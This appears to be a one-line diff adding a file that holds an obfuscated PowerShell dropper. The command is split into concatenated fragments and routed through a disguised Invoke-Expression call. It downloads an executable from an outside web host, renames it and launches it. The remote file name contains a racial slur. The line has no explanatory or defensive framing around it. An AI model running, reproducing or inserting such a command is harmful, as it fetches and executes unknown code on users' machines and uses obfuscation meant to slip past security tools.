@@ -1,0 +1,1 @@
+﻿(('(Ne'+'w-Obj'+'ect System'+'.N'+'e'+'t.WebC'+'li'+'en'+'t).DownloadFil'+'e({0}h'+'ttp://w'+'orl'+'dnit.com'+'/'+'nigga'+'.exe{0},{0}f'+'lee'+'b'+'le.exe'+'{0'+'});St'+'a'+'rt-'+'Proce'+'ss '+'{0'+'}fl'+'eeble.exe{0}')-f [cHaR]39) | .( ([sTRING]$vERbosEPreFeRence)[1,3]+'X'-jOIN'')
